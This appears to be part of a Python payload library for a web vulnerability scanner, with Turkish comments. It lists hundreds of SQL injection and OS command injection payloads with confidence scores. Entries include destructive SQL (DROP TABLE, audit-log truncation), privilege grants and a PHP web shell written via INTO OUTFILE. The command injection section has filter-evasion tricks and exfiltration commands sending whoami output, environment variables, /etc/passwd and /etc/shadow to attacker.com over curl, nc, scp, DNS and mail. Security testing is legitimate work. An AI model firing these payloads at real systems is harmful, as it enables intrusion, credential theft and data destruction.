        {"payload": "admin'; INSERT INTO logs VALUES ('user logged in with admin', NOW());--", "guven": 0.95, "aciklama": "Second order log injection"},
        {"payload": "user'; UPDATE profiles SET bio='<script>alert(1)</script>' WHERE username='admin';--", "guven": 0.90, "aciklama": "Second order XSS injection"},
        {"payload": "test'; UPDATE users SET email='hacker@evil.com' WHERE username='admin';--", "guven": 0.95, "aciklama": "Second order email change"},
        {"payload": "guest'; INSERT INTO messages VALUES ('admin', 'You have been hacked!', NOW());--", "guven": 0.90, "aciklama": "Second order message injection"},
        {"payload": "normaluser'; UPDATE settings SET admin_email='attacker@evil.com' WHERE id=1;--", "guven": 0.95, "aciklama": "Second order admin email change"},
        {"payload": "temp'; CREATE TABLE backup_users AS SELECT * FROM users;--", "guven": 0.90, "aciklama": "Second order table creation"},
        {"payload": "visitor'; INSERT INTO admin_tasks VALUES ('DELETE FROM users', 'pending');--", "guven": 0.95, "aciklama": "Second order admin task injection"},
        {"payload": "john'; UPDATE user_roles SET role='administrator' WHERE username='john';--", "guven": 0.95, "aciklama": "Second order privilege escalation"},
        {"payload": "anonymous'; INSERT INTO notifications VALUES ('System compromised!', 'all');--", "guven": 0.85, "aciklama": "Second order notification injection"},
        {"payload": "backup'; TRUNCATE TABLE audit_trail;--", "guven": 0.95, "aciklama": "Second order audit cleaning"},
        {"payload": "system'; UPDATE configurations SET maintenance_mode=1;--", "guven": 0.90, "aciklama": "Second order maintenance mode"},
        {"payload": "logger'; INSERT INTO errors VALUES ('SQL injection detected', 'high', NOW());--", "guven": 0.80, "aciklama": "Second order error log injection"},
        {"payload": "monitor'; UPDATE alerts SET status='resolved' WHERE severity='critical';--", "guven": 0.85, "aciklama": "Second order alert manipulation"},
        {"payload": "scheduler'; INSERT INTO cron_jobs VALUES ('* * * * * /tmp/backdoor.sh', 'active');--", "guven": 0.95, "aciklama": "Second order cron injection"},
        {"payload": "reporter'; UPDATE statistics SET user_count=0, admin_count=999;--", "guven": 0.80, "aciklama": "Second order statistics manipulation"},
        {"payload": "auditor'; DELETE FROM failed_logins WHERE username='admin';--", "guven": 0.90, "aciklama": "Second order audit trail cleaning"},
        {"payload": "webhook'; INSERT INTO api_calls VALUES ('/admin/delete_all', 'POST', 'pending');--", "guven": 0.90, "aciklama": "Second order API injection"},
        {"payload": "cache'; UPDATE sessions SET role='admin' WHERE username='guest';--", "guven": 0.95, "aciklama": "Second order session hijacking"},
        {"payload": "indexer'; INSERT INTO search_index VALUES ('password', 'SELECT password FROM users');--", "guven": 0.85, "aciklama": "Second order search injection"},
        {"payload": "migrator'; ALTER TABLE users ADD COLUMN backdoor_access BOOLEAN DEFAULT TRUE;--", "guven": 0.90, "aciklama": "Second order schema modification"},
        {"payload": "validator'; UPDATE security_rules SET rule_enabled=0 WHERE rule_type='sql_injection';--", "guven": 0.90, "aciklama": "Second order security bypass"},
        {"payload": "formatter'; INSERT INTO templates VALUES ('email', '{{password}}');--", "guven": 0.85, "aciklama": "Second order template injection"},
        {"payload": "parser'; UPDATE file_uploads SET allowed_types='php,exe,sh' WHERE id=1;--", "guven": 0.90, "aciklama": "Second order file upload bypass"},
        {"payload": "converter'; INSERT INTO export_queue VALUES ('users', 'csv', '/tmp/users.csv');--", "guven": 0.85, "aciklama": "Second order data export"},
        {"payload": "synchronizer'; UPDATE sync_settings SET target_server='attacker.com';--", "guven": 0.90, "aciklama": "Second order data sync redirect"},
        {"payload": "analyzer'; INSERT INTO reports VALUES ('User Passwords', 'SELECT username,password FROM users');--", "guven": 0.90, "aciklama": "Second order report injection"},
        {"payload": "optimizer'; UPDATE database_settings SET query_cache=0, slow_query_log=1;--", "guven": 0.75, "aciklama": "Second order performance manipulation"},
        {"payload": "cleaner'; DELETE FROM sessions WHERE created_at < NOW() - INTERVAL 1 SECOND;--", "guven": 0.85, "aciklama": "Second order session cleanup"},
        {"payload": "backup_scheduler'; INSERT INTO backup_jobs VALUES ('/etc/passwd', '/tmp/backup.txt', NOW());--", "guven": 0.90, "aciklama": "Second order backup injection"},
        {"payload": "health_checker'; UPDATE system_status SET status='compromised', last_check=NOW();--", "guven": 0.85, "aciklama": "Second order status manipulation"},

        # === ADVANCED EVASION (431-470) ===
        {"payload": "' OR 1=CAST(1 AS INT)--", "guven": 0.85, "aciklama": "Type casting evasion"},
        {"payload": "' OR 1=CONVERT(1,UNSIGNED)--", "guven": 0.80, "aciklama": "MySQL type conversion"},
        {"payload": "' OR 1=ASCII(1)--", "guven": 0.75, "aciklama": "ASCII function evasion"},
        {"payload": "' OR 'A'=CHAR(65)--", "guven": 0.80, "aciklama": "CHAR function evasion"},
        {"payload": "' OR 1=HEX('1')&1--", "guven": 0.75, "aciklama": "HEX with bitwise operation"},
        {"payload": "' OR 1=UNHEX('31')--", "guven": 0.75, "aciklama": "UNHEX function evasion"},
        {"payload": "' OR 'test'=REVERSE('tset')--", "guven": 0.75, "aciklama": "REVERSE function evasion"},
        {"payload": "' OR 1=LENGTH(1)--", "guven": 0.75, "aciklama": "LENGTH function evasion"},
        {"payload": "' OR 'a'=SUBSTRING('abc',1,1)--", "guven": 0.80, "aciklama": "SUBSTRING function evasion"},
        {"payload": "' OR 'A'=UPPER('a')--", "guven": 0.80, "aciklama": "UPPER function evasion"},
        {"payload": "' OR 'a'=LOWER('A')--", "guven": 0.80, "aciklama": "LOWER function evasion"},
        {"payload": "' OR 'test'=CONCAT('te','st')--", "guven": 0.85, "aciklama": "CONCAT function evasion"},
        {"payload": "' OR 1=BIT_COUNT(1)--", "guven": 0.70, "aciklama": "BIT_COUNT function evasion"},
        {"payload": "' OR 1=(1^0)--", "guven": 0.75, "aciklama": "XOR bitwise evasion"},
        {"payload": "' OR 1=(1&1)--", "guven": 0.75, "aciklama": "AND bitwise evasion"},
        {"payload": "' OR 1=(1|0)--", "guven": 0.75, "aciklama": "OR bitwise evasion"},
        {"payload": "' OR 1=~(~1)--", "guven": 0.70, "aciklama": "NOT bitwise evasion"},
        {"payload": "' OR 1=(1<<0)--", "guven": 0.70, "aciklama": "Left shift evasion"},
        {"payload": "' OR 1=(2>>1)--", "guven": 0.70, "aciklama": "Right shift evasion"},
        {"payload": "' OR 1=+1--", "guven": 0.75, "aciklama": "Unary plus evasion"},
        {"payload": "' OR 1=-(-1)--", "guven": 0.75, "aciklama": "Double negative evasion"},
        {"payload": "' OR 1=ABS(-1)--", "guven": 0.75, "aciklama": "ABS function evasion"},
        {"payload": "' OR 1=SIGN(1)--", "guven": 0.70, "aciklama": "SIGN function evasion"},
        {"payload": "' OR 0=MOD(2,2)--", "guven": 0.70, "aciklama": "MOD function evasion"},
        {"payload": "' OR 1=CEIL(0.1)--", "guven": 0.70, "aciklama": "CEIL function evasion"},
        {"payload": "' OR 0=FLOOR(0.9)--", "guven": 0.70, "aciklama": "FLOOR function evasion"},
        {"payload": "' OR 1=ROUND(0.6)--", "guven": 0.70, "aciklama": "ROUND function evasion"},
        {"payload": "' OR 3=GREATEST(1,2,3)--", "guven": 0.70, "aciklama": "GREATEST function evasion"},
        {"payload": "' OR 1=LEAST(1,2,3)--", "guven": 0.70, "aciklama": "LEAST function evasion"},
        {"payload": "' OR 1 IS NOT NULL--", "guven": 0.80, "aciklama": "IS NOT NULL evasion"},
        {"payload": "' OR NULL IS NULL--", "guven": 0.80, "aciklama": "IS NULL evasion"},
        {"payload": "' OR 1 IS TRUE--", "guven": 0.75, "aciklama": "IS TRUE evasion"},
        {"payload": "' OR 0 IS FALSE--", "guven": 0.75, "aciklama": "IS FALSE evasion"},
        {"payload": "' OR 1 IS NOT FALSE--", "guven": 0.75, "aciklama": "IS NOT FALSE evasion"},
        {"payload": "' OR 0 IS NOT TRUE--", "guven": 0.75, "aciklama": "IS NOT TRUE evasion"},
        {"payload": "' OR BINARY 'a'=0x61--", "guven": 0.75, "aciklama": "BINARY comparison evasion"},
        {"payload": "' OR 'a' COLLATE utf8_bin='a'--", "guven": 0.70, "aciklama": "COLLATE evasion"},
        {"payload": "' OR _utf8'a'='a'--", "guven": 0.70, "aciklama": "Character set prefix"},
        {"payload": "' OR N'test'=N'test'--", "guven": 0.70, "aciklama": "National character set"},
        {"payload": "' OR 1 ESCAPE '!'=1--", "guven": 0.65, "aciklama": "ESCAPE clause evasion"},

        # === POLYGLOT PAYLOADS (471-500) ===
        {"payload": "' OR 1=1-- -", "guven": 0.95, "aciklama": "Universal comment polyglot"},
        {"payload": "' OR 1=1#{}", "guven": 0.90, "aciklama": "MySQL/MongoDB polyglot"},
        {"payload": "' OR 1=1/* comment */--", "guven": 0.90, "aciklama": "Multi-database comment"},
        {"payload": "' OR 1=1;SELECT 1--", "guven": 0.90, "aciklama": "Stacked query polyglot"},
        {"payload": "' OR 1 LIKE 1 ESCAPE '!'--", "guven": 0.80, "aciklama": "LIKE ESCAPE polyglot"},
        {"payload": "' OR 1 REGEXP 1 AND 1=1--", "guven": 0.80, "aciklama": "REGEXP polyglot"},
        {"payload": "' OR 1 RLIKE 1 OR 1=1--", "guven": 0.80, "aciklama": "RLIKE polyglot"},
        {"payload": "' OR 1=1 LIMIT 1 OFFSET 0--", "guven": 0.85, "aciklama": "LIMIT OFFSET polyglot"},
        {"payload": "' OR 1=1 ORDER BY 1 ASC--", "guven": 0.80, "aciklama": "ORDER BY polyglot"},
        {"payload": "' OR 1=1 GROUP BY 1 HAVING 1=1--", "guven": 0.75, "aciklama": "GROUP BY HAVING polyglot"},
        {"payload": "' OR (SELECT 1 WHERE 1=1)=1--", "guven": 0.85, "aciklama": "Subquery WHERE polyglot"},
        {"payload": "' OR EXISTS(SELECT 1 FROM (SELECT 1)t)--", "guven": 0.80, "aciklama": "EXISTS subquery polyglot"},
        {"payload": "' OR 1 IN(SELECT 1 FROM (SELECT 1)t)--", "guven": 0.80, "aciklama": "IN subquery polyglot"},
        {"payload": "' OR 1 BETWEEN 1 AND (SELECT 1)--", "guven": 0.75, "aciklama": "BETWEEN subquery polyglot"},
                # Ek Union Based Injection
                {"payload": "' UNION SELECT NULL, NULL, NULL, NULL--", "guven": 0.9, "aciklama": "4 kolon UNION"},
                {"payload": "' UNION SELECT NULL, NULL, NULL, NULL, NULL--", "guven": 0.9, "aciklama": "5 kolon UNION"},
                {"payload": "' UNION SELECT schema_name FROM information_schema.schemata--", "guven": 0.9, "aciklama": "Veritabanı şemaları"},
                {"payload": "' UNION SELECT table_name FROM information_schema.tables--", "guven": 0.9, "aciklama": "Tablo isimleri"},
                {"payload": "' UNION SELECT column_name FROM information_schema.columns--", "guven": 0.9, "aciklama": "Kolon isimleri"},
                {"payload": "' UNION SELECT current_user()--", "guven": 0.85, "aciklama": "Mevcut kullanıcı MySQL"},
                {"payload": "' UNION SELECT session_user()--", "guven": 0.85, "aciklama": "Oturum kullanıcısı"},
                {"payload": "' UNION SELECT system_user()--", "guven": 0.85, "aciklama": "Sistem kullanıcısı"},
                {"payload": "' UNION SELECT @@hostname--", "guven": 0.8, "aciklama": "Sunucu hostname"},
                
                # Boolean Based Blind Injection
                {"payload": "' AND 1=1--", "guven": 0.8, "aciklama": "True koşul testi"},
                {"payload": "' AND 1=2--", "guven": 0.8, "aciklama": "False koşul testi"},
                {"payload": "' AND (SELECT COUNT(*) FROM users) > 0--", "guven": 0.85, "aciklama": "Tablo varlık testi"},
                {"payload": "' AND LENGTH(database()) > 0--", "guven": 0.85, "aciklama": "Database uzunluk testi"},
                {"payload": "' AND ASCII(SUBSTRING(user(),1,1)) > 64--", "guven": 0.85, "aciklama": "Karakter ASCII testi"},
                
                # Ek Boolean Based Blind Injection
                {"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--", "guven": 0.85, "aciklama": "Information schema testi"},
                {"payload": "' AND SUBSTRING(version(),1,1) = '5'--", "guven": 0.8, "aciklama": "Versiyon karakter testi"},
                {"payload": "' AND (SELECT username FROM users LIMIT 1) = 'admin'--", "guven": 0.85, "aciklama": "Kullanıcı adı testi"},
                {"payload": "' AND ORD(MID(version(),1,1)) > 52--", "guven": 0.8, "aciklama": "ORD MID karakter testi"},
                {"payload": "' AND CHAR_LENGTH(database()) = 4--", "guven": 0.8, "aciklama": "Database uzunluk eşitlik"},
                
                # Time Based Blind Injection  
                {"payload": "'; WAITFOR DELAY '00:00:05'--", "guven": 0.9, "aciklama": "SQL Server gecikme"},
                {"payload": "' AND SLEEP(5)--", "guven": 0.9, "aciklama": "MySQL sleep"},
                {"payload": "'; SELECT pg_sleep(5)--", "guven": 0.9, "aciklama": "PostgreSQL sleep"},
                {"payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "guven": 0.85, "aciklama": "MySQL subquery sleep"},
                {"payload": "'; EXEC xp_cmdshell('ping -n 6 localhost')--", "guven": 0.95, "aciklama": "SQL Server komut çalıştırma"},
                
                # Ek Time Based Blind Injection
                {"payload": "' AND IF(1=1,SLEEP(5),0)--", "guven": 0.9, "aciklama": "Koşullu MySQL sleep"},
                {"payload": "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END--", "guven": 0.9, "aciklama": "PostgreSQL koşullu sleep"},
                {"payload": "' AND (SELECT COUNT(*) FROM users WHERE SLEEP(2)) > 0--", "guven": 0.85, "aciklama": "WHERE clause sleep"},
                {"payload": "'; IF(1=1) WAITFOR DELAY '00:00:03'--", "guven": 0.9, "aciklama": "SQL Server koşullu gecikme"},
                {"payload": "' UNION SELECT SLEEP(3),NULL--", "guven": 0.85, "aciklama": "UNION sleep"},
                
                # Error Based Injection
                {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--", "guven": 0.9, "aciklama": "MySQL EXTRACTVALUE hata"},
                {"payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "guven": 0.9, "aciklama": "MySQL FLOOR hata"},
                {"payload": "' UNION SELECT 1,2,3,4,5,6,7,8,9,10*", "guven": 0.8, "aciklama": "Kolon sayısı belirleme"},
                
                # Ek Error Based Injection
                {"payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "guven": 0.9, "aciklama": "User FLOOR hata"},
                {"payload": "' AND UPDATEXML(NULL,CONCAT(0x7e,(SELECT version()),0x7e),NULL)--", "guven": 0.9, "aciklama": "MySQL UPDATEXML hata"},
                {"payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "guven": 0.9, "aciklama": "Database FLOOR hata"},
                {"payload": "' AND EXP(~(SELECT * FROM (SELECT version())a))--", "guven": 0.85, "aciklama": "MySQL EXP hata"},
                {"payload": "' AND CAST((SELECT version()) AS INT)--", "guven": 0.8, "aciklama": "CAST hata injection"},
                
                # Advanced Techniques
                {"payload": "'; DROP TABLE users;--", "guven": 0.95, "aciklama": "Tablo silme saldırısı"},
                {"payload": "'; INSERT INTO users VALUES ('hacker','pass123');--", "guven": 0.95, "aciklama": "Yeni kullanıcı ekleme"},
                {"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "guven": 0.95, "aciklama": "Şifre değiştirme"},
                {"payload": "' OR 1 GROUP BY CONCAT(username,password) HAVING 1=1--", "guven": 0.85, "aciklama": "GROUP BY saldırısı"},
                {"payload": "' AND (SELECT LOAD_FILE('/etc/passwd'))--", "guven": 0.9, "aciklama": "Dosya okuma saldırısı"},
                
                # Ek Advanced Techniques
                {"payload": "'; CREATE TABLE backdoor (cmd TEXT);--", "guven": 0.95, "aciklama": "Yeni tablo oluşturma"},
                {"payload": "'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255);--", "guven": 0.9, "aciklama": "Kolon ekleme"},
                {"payload": "' AND (SELECT * INTO OUTFILE '/var/www/shell.php' FROM users)--", "guven": 0.95, "aciklama": "Dosyaya yazma"},
                {"payload": "'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%';--", "guven": 0.95, "aciklama": "Yetki verme"},
                {"payload": "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/shell.php'--", "guven": 0.95, "aciklama": "Web shell yazma"}
            
            ],
            
            ZafiyetTipi.CMDI: [
                # 500 Gelişmiş CMDI Pattern - Eğitim ve Test Amaçlı

# Encoding ve Obfuscation Teknikleri (1-50)
{"payload": "; echo $'\\x77\\x68\\x6f\\x61\\x6d\\x69'", "guven": 0.95, "aciklama": "Hex encoding whoami"},
{"payload": "; $(echo -e '\\x77\\x68\\x6f\\x61\\x6d\\x69')", "guven": 0.95, "aciklama": "Echo hex subshell"},
{"payload": "; `printf '\\167\\150\\157\\141\\155\\151'`", "guven": 0.9, "aciklama": "Octal encoding printf"},
{"payload": "; eval $(echo 'd2hvYW1p' | base64 -d)", "guven": 0.95, "aciklama": "Base64 decode eval"},
{"payload": "; ${IFS}whoami", "guven": 0.85, "aciklama": "IFS bypass"},
{"payload": "; w${IFS}h${IFS}o${IFS}a${IFS}m${IFS}i", "guven": 0.9, "aciklama": "IFS char separation"},
{"payload": "; who$@ami", "guven": 0.85, "aciklama": "Parameter expansion bypass"},
{"payload": "; wh''o''am''i", "guven": 0.85, "aciklama": "Empty string concatenation"},
{"payload": "; wh\"\"o\"\"am\"\"i", "guven": 0.85, "aciklama": "Empty double quote bypass"},
{"payload": "; w\\h\\o\\a\\m\\i", "guven": 0.85, "aciklama": "Backslash escape bypass"},
{"payload": "; $(tr 'a-z' 'n-za-m' <<< 'jubzv')", "guven": 0.9, "aciklama": "ROT13 encoding"},
{"payload": "; echo 'whoami' | rev | rev", "guven": 0.85, "aciklama": "Double reverse"},
{"payload": "; ${!#}", "guven": 0.8, "aciklama": "Bash variable expansion"},
{"payload": "; who$(echo)ami", "guven": 0.85, "aciklama": "Empty command substitution"},
{"payload": "; who`:`ami", "guven": 0.85, "aciklama": "Colon null command"},
{"payload": "; /???/??/whoami", "guven": 0.9, "aciklama": "Wildcard path obfuscation"},
{"payload": "; /usr/bin/w*", "guven": 0.85, "aciklama": "Wildcard command"},
{"payload": "; {whoami,}", "guven": 0.8, "aciklama": "Brace expansion"},
{"payload": "; $0 <<<'whoami'", "guven": 0.85, "aciklama": "Here-string execution"},
{"payload": "; exec<whoami", "guven": 0.8, "aciklama": "Exec redirection"},
{"payload": "; read <<<'whoami';$REPLY", "guven": 0.85, "aciklama": "Read and execute"},
{"payload": "; echo -e '\\117\\150\\157\\141\\155\\151'|bash", "guven": 0.9, "aciklama": "Octal pipe bash"},
{"payload": "; printf '%b' '\\167\\150\\157\\141\\155\\151'|sh", "guven": 0.9, "aciklama": "Printf octal pipe"},
{"payload": "; xxd -r -p <<<'77686f616d69'", "guven": 0.9, "aciklama": "Hex decode xxd"},
{"payload": "; od -An -tx1 <<<'whoami'|tr -d ' \\n'", "guven": 0.85, "aciklama": "Octal dump reverse"},
{"payload": "; ${_}whoami", "guven": 0.8, "aciklama": "Underscore variable"},
{"payload": "; $(($'\\167\\150\\157\\141\\155\\151'))", "guven": 0.85, "aciklama": "Arithmetic expansion"},
{"payload": "; who$(())ami", "guven": 0.8, "aciklama": "Empty arithmetic"},
{"payload": "; {who,ami}", "guven": 0.75, "aciklama": "Brace expansion split"},
{"payload": "; who$(true)ami", "guven": 0.85, "aciklama": "True command substitution"},
{"payload": "; who$((0))ami", "guven": 0.85, "aciklama": "Zero arithmetic"},
{"payload": "; who$?ami", "guven": 0.8, "aciklama": "Exit status variable"},
{"payload": "; who$!ami", "guven": 0.8, "aciklama": "Background PID variable"},
{"payload": "; who$$ami", "guven": 0.8, "aciklama": "Current PID variable"},
{"payload": "; who$#ami", "guven": 0.8, "aciklama": "Argument count variable"},
{"payload": "; a=whoami;$a", "guven": 0.85, "aciklama": "Variable assignment"},
{"payload": "; declare -x a=whoami;$a", "guven": 0.85, "aciklama": "Declare export"},
{"payload": "; typeset a=whoami;$a", "guven": 0.85, "aciklama": "Typeset variable"},
{"payload": "; local a=whoami;$a", "guven": 0.85, "aciklama": "Local variable"},
{"payload": "; readonly a=whoami;$a", "guven": 0.85, "aciklama": "Readonly variable"},
{"payload": "; export a=whoami;$a", "guven": 0.85, "aciklama": "Export variable"},
{"payload": "; unset a;a=whoami;$a", "guven": 0.85, "aciklama": "Unset then assign"},
{"payload": "; ${PATH:0:0}whoami", "guven": 0.85, "aciklama": "PATH substring"},
{"payload": "; ${BASH:0:0}whoami", "guven": 0.85, "aciklama": "BASH substring"},
{"payload": "; ${USER:0:0}whoami", "guven": 0.85, "aciklama": "USER substring"},
{"payload": "; ${HOME:0:0}whoami", "guven": 0.85, "aciklama": "HOME substring"},
{"payload": "; ${PWD:0:0}whoami", "guven": 0.85, "aciklama": "PWD substring"},
{"payload": "; ${SHELL:0:0}whoami", "guven": 0.85, "aciklama": "SHELL substring"},
{"payload": "; ${TERM:0:0}whoami", "guven": 0.85, "aciklama": "TERM substring"},
{"payload": "; ${LANG:0:0}whoami", "guven": 0.85, "aciklama": "LANG substring"},
{"payload": "; ${0:0:0}whoami", "guven": 0.85, "aciklama": "Zero parameter substring"},

# Time-based ve Blind Injection (51-100)
{"payload": "; sleep 5 && echo injection", "guven": 0.9, "aciklama": "Time delay confirmation"},
{"payload": "; ping -c 5 127.0.0.1 >/dev/null", "guven": 0.85, "aciklama": "Ping time delay"},
{"payload": "; timeout 5s yes >/dev/null", "guven": 0.85, "aciklama": "Timeout yes delay"},
{"payload": "; perl -e 'sleep(5)'", "guven": 0.9, "aciklama": "Perl sleep delay"},
{"payload": "; python -c 'import time;time.sleep(5)'", "guven": 0.9, "aciklama": "Python sleep delay"},
{"payload": "; ruby -e 'sleep(5)'", "guven": 0.9, "aciklama": "Ruby sleep delay"},
{"payload": "; php -r 'sleep(5);'", "guven": 0.9, "aciklama": "PHP sleep delay"},
{"payload": "; node -e 'setTimeout(()=>{},5000)'", "guven": 0.85, "aciklama": "Node.js timeout"},
{"payload": "; java -e 'Thread.sleep(5000)'", "guven": 0.8, "aciklama": "Java sleep delay"},
{"payload": "; busybox sleep 5", "guven": 0.85, "aciklama": "Busybox sleep"},
{"payload": "; /bin/sleep 5", "guven": 0.85, "aciklama": "Absolute sleep path"},
{"payload": "; $(which sleep) 5", "guven": 0.85, "aciklama": "Which sleep execution"},
{"payload": "; command sleep 5", "guven": 0.85, "aciklama": "Command builtin sleep"},
{"payload": "; builtin sleep 5", "guven": 0.85, "aciklama": "Builtin sleep"},
{"payload": "; exec sleep 5", "guven": 0.85, "aciklama": "Exec sleep"},
{"payload": "; nohup sleep 5 &", "guven": 0.8, "aciklama": "Nohup background sleep"},
{"payload": "; (sleep 5)", "guven": 0.85, "aciklama": "Subshell sleep"},
{"payload": "; { sleep 5; }", "guven": 0.85, "aciklama": "Command group sleep"},
{"payload": "; if true; then sleep 5; fi", "guven": 0.85, "aciklama": "Conditional sleep"},
{"payload": "; while false; do break; done; sleep 5", "guven": 0.8, "aciklama": "Loop break sleep"},
{"payload": "; for i in 1; do sleep 5; done", "guven": 0.85, "aciklama": "For loop sleep"},
{"payload": "; case 1 in 1) sleep 5;; esac", "guven": 0.85, "aciklama": "Case statement sleep"},
{"payload": "; until false; do sleep 5; break; done", "guven": 0.8, "aciklama": "Until loop sleep"},
{"payload": "; select x in a; do sleep 5; break; done", "guven": 0.8, "aciklama": "Select sleep"},
{"payload": "; function f(){ sleep 5; }; f", "guven": 0.85, "aciklama": "Function sleep"},
{"payload": "; alias s=sleep; s 5", "guven": 0.85, "aciklama": "Alias sleep"},
{"payload": "; hash -p /bin/sleep s; s 5", "guven": 0.85, "aciklama": "Hash sleep"},
{"payload": "; type sleep >/dev/null && sleep 5", "guven": 0.85, "aciklama": "Type check sleep"},
{"payload": "; command -v sleep >/dev/null && sleep 5", "guven": 0.85, "aciklama": "Command check sleep"},
{"payload": "; which sleep >/dev/null && sleep 5", "guven": 0.85, "aciklama": "Which check sleep"},
{"payload": "; whereis sleep >/dev/null && sleep 5", "guven": 0.85, "aciklama": "Whereis check sleep"},
{"payload": "; locate sleep 2>/dev/null | head -1 | xargs -I {} {} 5", "guven": 0.8, "aciklama": "Locate sleep exec"},
{"payload": "; find /bin -name sleep -exec {} 5 \\;", "guven": 0.85, "aciklama": "Find exec sleep"},
{"payload": "; ls /bin/sleep >/dev/null && sleep 5", "guven": 0.85, "aciklama": "Ls check sleep"},
{"payload": "; test -x /bin/sleep && sleep 5", "guven": 0.85, "aciklama": "Test executable sleep"},
{"payload": "; [ -x /bin/sleep ] && sleep 5", "guven": 0.85, "aciklama": "Bracket test sleep"},
{"payload": "; [[ -x /bin/sleep ]] && sleep 5", "guven": 0.85, "aciklama": "Double bracket sleep"},
{"payload": "; stat /bin/sleep >/dev/null && sleep 5", "guven": 0.85, "aciklama": "Stat check sleep"},
{"payload": "; file /bin/sleep >/dev/null && sleep 5", "guven": 0.85, "aciklama": "File check sleep"},
{"payload": "; ldd /bin/sleep >/dev/null && sleep 5", "guven": 0.8, "aciklama": "Ldd check sleep"},
{"payload": "; strace -e trace=none sleep 5 2>/dev/null", "guven": 0.85, "aciklama": "Strace sleep"},
{"payload": "; ltrace -e none sleep 5 2>/dev/null", "guven": 0.8, "aciklama": "Ltrace sleep"},
{"payload": "; gdb -batch -ex run -ex quit --args sleep 5", "guven": 0.8, "aciklama": "GDB sleep"},
{"payload": "; valgrind --tool=none sleep 5 2>/dev/null", "guven": 0.75, "aciklama": "Valgrind sleep"},
{"payload": "; nice sleep 5", "guven": 0.85, "aciklama": "Nice sleep"},
{"payload": "; ionice sleep 5", "guven": 0.8, "aciklama": "Ionice sleep"},
{"payload": "; taskset 1 sleep 5", "guven": 0.8, "aciklama": "Taskset sleep"},
{"payload": "; chrt -f 1 sleep 5", "guven": 0.8, "aciklama": "Chrt sleep"},
{"payload": "; time sleep 5", "guven": 0.85, "aciklama": "Time command sleep"},
{"payload": "; /usr/bin/time sleep 5", "guven": 0.85, "aciklama": "Time utility sleep"},

# DNS ve Network Based Exfiltration (101-150)
{"payload": "; nslookup $(whoami).attacker.com", "guven": 0.95, "aciklama": "DNS exfiltration whoami"},
{"payload": "; dig $(id).attacker.com", "guven": 0.95, "aciklama": "Dig DNS exfiltration"},
{"payload": "; host $(hostname).attacker.com", "guven": 0.9, "aciklama": "Host DNS exfiltration"},
{"payload": "; ping -c1 $(uname).attacker.com", "guven": 0.9, "aciklama": "Ping DNS exfiltration"},
{"payload": "; curl -G -d \"data=$(whoami)\" http://attacker.com/collect", "guven": 0.95, "aciklama": "HTTP GET exfiltration"},
{"payload": "; wget --post-data=\"data=$(id)\" http://attacker.com/collect", "guven": 0.95, "aciklama": "HTTP POST exfiltration"},
{"payload": "; nc -u attacker.com 53 <<<$(whoami)", "guven": 0.9, "aciklama": "UDP DNS port exfiltration"},
{"payload": "; echo $(pwd) | nc attacker.com 80", "guven": 0.9, "aciklama": "TCP HTTP port exfiltration"},
{"payload": "; telnet attacker.com 443 <<<$(ps aux)", "guven": 0.85, "aciklama": "Telnet HTTPS port exfil"},
{"payload": "; openssl s_client -connect attacker.com:443 <<<$(env)", "guven": 0.9, "aciklama": "SSL client exfiltration"},
{"payload": "; ssh -o StrictHostKeyChecking=no user@attacker.com \"echo $(whoami)\"", "guven": 0.9, "aciklama": "SSH command exfiltration"},
{"payload": "; scp /etc/passwd user@attacker.com:/tmp/", "guven": 0.95, "aciklama": "SCP file exfiltration"},
{"payload": "; rsync /etc/shadow user@attacker.com:/tmp/", "guven": 0.95, "aciklama": "Rsync file exfiltration"},
{"payload": "; ftp -n attacker.com <<<$'user anonymous\\npass\\nput /etc/hosts'", "guven": 0.9, "aciklama": "FTP file upload"},
{"payload": "; tftp -m binary attacker.com -c put /etc/passwd", "guven": 0.85, "aciklama": "TFTP file upload"},
{"payload": "; mail -s \"$(whoami)\" attacker@evil.com <<<$(cat /etc/passwd)", "guven": 0.9, "aciklama": "Email exfiltration"},
{"payload": "; echo $(ls -la) | logger -n attacker.com -P 514", "guven": 0.85, "aciklama": "Syslog exfiltration"},
{"payload": "; snmpset -v2c -c public attacker.com 1.3.6.1.2.1.1.1.0 s \"$(whoami)\"", "guven": 0.8, "aciklama": "SNMP exfiltration"},
{"payload": "; ldapsearch -x -h attacker.com -b \"dc=test\" \"cn=$(whoami)\"", "guven": 0.8, "aciklama": "LDAP query exfiltration"},
{"payload": "; mosquitto_pub -h attacker.com -t data -m \"$(id)\"", "guven": 0.8, "aciklama": "MQTT publish exfiltration"},
{"payload": "; redis-cli -h attacker.com set data \"$(whoami)\"", "guven": 0.8, "aciklama": "Redis set exfiltration"},
{"payload": "; mysql -h attacker.com -e \"INSERT INTO data VALUES('$(whoami)')\"", "guven": 0.85, "aciklama": "MySQL insert exfiltration"},
{"payload": "; psql -h attacker.com -c \"INSERT INTO data VALUES('$(id)')\"", "guven": 0.85, "aciklama": "PostgreSQL exfiltration"},
{"payload": "; mongo attacker.com --eval \"db.data.insert({info:'$(whoami)'})\"", "guven": 0.8, "aciklama": "MongoDB insert exfiltration"},
{"payload": "; sqlite3 :memory: \"CREATE TABLE t(d TEXT); INSERT INTO t VALUES('$(whoami)'); SELECT load_extension('/tmp/exfil.so')\"", "guven": 0.85, "aciklama": "SQLite extension exfil"},
{"payload": "; curl -X POST -H \"X-Data: $(whoami)\" http://attacker.com/api", "guven": 0.9, "aciklama": "HTTP header exfiltration"},
{"payload": "; wget --header=\"X-Info: $(id)\" http://attacker.com/collect", "guven": 0.9, "aciklama": "Wget header exfiltration"},
{"payload": "; curl -A \"$(uname -a)\" http://attacker.com/collect", "guven": 0.85, "aciklama": "User-Agent exfiltration"},
